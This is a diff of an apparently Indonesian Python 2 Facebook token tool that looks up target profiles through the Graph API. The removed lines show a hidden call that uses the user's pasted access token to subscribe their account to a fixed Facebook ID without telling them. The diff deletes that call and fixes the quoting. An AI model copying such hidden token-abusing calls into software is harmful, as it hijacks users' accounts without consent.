@@ -97,7 +97,7 @@ def __raka_sayang_amanda__():
         elif masuk == "1":
 		token = raw_input("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Token  : \033[0;36m")
 		try:
-                	y = requests.get("https://graph.facebook.com/'+idt+'?access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
+                	y = requests.get('https://graph.facebook.com/me?access_token='+token)
 	                x = json.loads(y.text)
 	                nama = x['name']
 	                save = open("login.txt", 'w')
@@ -174,7 +174,7 @@ def __menu__():
 		idt = raw_input("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Target : \033[0;36m")
 		try:
 			token=open('login.txt','r').read()
-			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
+			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
 			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Nama : \033[0;36m"+sp["name"])
 		except KeyError:
@@ -188,7 +188,7 @@ def __menu__():
 		idt = raw_input("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Target : \033[0;36m")
 		try:
 			token=open('login.txt','r').read()
-			pok = requests.get("https://graph.facebook.com/'+idt+'?access_token="+token)
+			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
 			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Nama : \033[0;36m"+sp["name"])
 		except KeyError:
@@ -217,7 +217,7 @@ def __menu__():
 		sys.stdout.flush()
 		uid = arg
 		try:
-			d = requests.get("https://graph.facebook.com/'+idt+'?access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
+			d = requests.get('https://graph.facebook.com/'+uid+'/?access_token='+token)
 	                v = json.loads(d.text)
 			nama = v['name']
 			first = v['first_name']
